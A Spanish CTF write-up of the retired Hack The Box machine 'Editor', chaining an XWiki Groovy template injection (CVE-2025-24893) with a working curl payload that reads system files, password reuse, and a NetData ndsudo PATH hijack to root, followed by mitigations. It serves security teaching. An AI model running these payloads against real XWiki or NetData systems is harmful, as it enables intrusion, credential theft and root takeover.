---
machine: Editor
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, xwiki, cve-2025-24893, velocity, netdata, cve-2024-32019]
---

# Editor — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

XWiki 15.10.8 es vulnerable a CVE-2025-24893, una inyección Velocity/Groovy en `SolrSearch` que permite leer archivos. La contraseña de Hibernate se reutiliza para `oliver`; el grupo `netdata` y el helper SUID `ndsudo` permiten un PATH hijack para obtener root.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p22,80,8080 <IP>
```

- SSH, nginx y Jetty.
- `editor.htb` sirve una landing React.
- XWiki 15.10.8 responde en el puerto 8080.

## Enumeración

- La landing enlaza al backend XWiki.
- `/xwiki/bin/view/Main/` y `Main.SolrSearch` son accesibles como invitado.
- La versión está dentro del rango afectado por CVE-2025-24893.

## Foothold

El parámetro `text` se interpola en una plantilla Velocity. Se usa `/get/Main/SolrSearch` con `media=rss` para evitar el renderizado normal y ejecutar Groovy.

```bash
curl -sL --get \
  --data-urlencode 'text=}}}{{async async=false}}{{groovy}}println(new File("/etc/passwd").text){{/groovy}}{{/async}}' \
  --data-urlencode 'media=rss' \
  'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch'
```

Con la misma primitiva se lee `/etc/xwiki/hibernate.cfg.xml` y se obtiene la contraseña de la base de datos. Se prueba contra los usuarios del sistema; `oliver` la reutiliza y permite SSH.

```bash
ssh oliver@editor.htb
id
```

## Escalada de privilegios

`oliver` pertenece al grupo `netdata`. El helper `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo` es SUID root y resuelve nombres de binarios contra `PATH` (CVE-2024-32019).

```bash
find / -perm -4000 -type f 2>/dev/null
strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo | grep -E '^[a-z][a-z-]*$'
```

Se coloca un ejecutable llamado `nvme` en un directorio controlado y se invoca `ndsudo nvme-list` con ese `PATH`. El helper ejecuta el binario como root; un ELF que llama a `setuid(0)` crea una shell SUID.

```bash
PATH=/tmp/p:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
/tmp/rootbash -p
```

## Evidencia

- Lectura de `/etc/passwd` y `hibernate.cfg.xml`.
- Acceso SSH como `oliver`.
- Permisos de `ndsudo` y salida de `strings`.
- Binario SUID y flag redactada.

## Lecciones aprendidas

- Una inyección de plantilla puede limitarse a lectura de archivos y aun así encadenar el resto.
- Las credenciales de una aplicación pueden reutilizarse en cuentas del sistema.
- Un helper SUID que resuelve binarios por nombre es un objetivo de PATH hijacking.

## Mitigaciones y detección

- Actualizar XWiki a 15.10.11, 16.4.1 o posterior.
- No reutilizar contraseñas de bases de datos en cuentas humanas.
- Actualizar NetData y revisar helpers SUID; usar rutas absolutas.
- Auditar ejecuciones de `ndsudo` y cambios en `PATH` de procesos privilegiados.

## Referencias

- <https://www.hackthebox.com/machines/Editor>
- <https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-24893>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-32019>
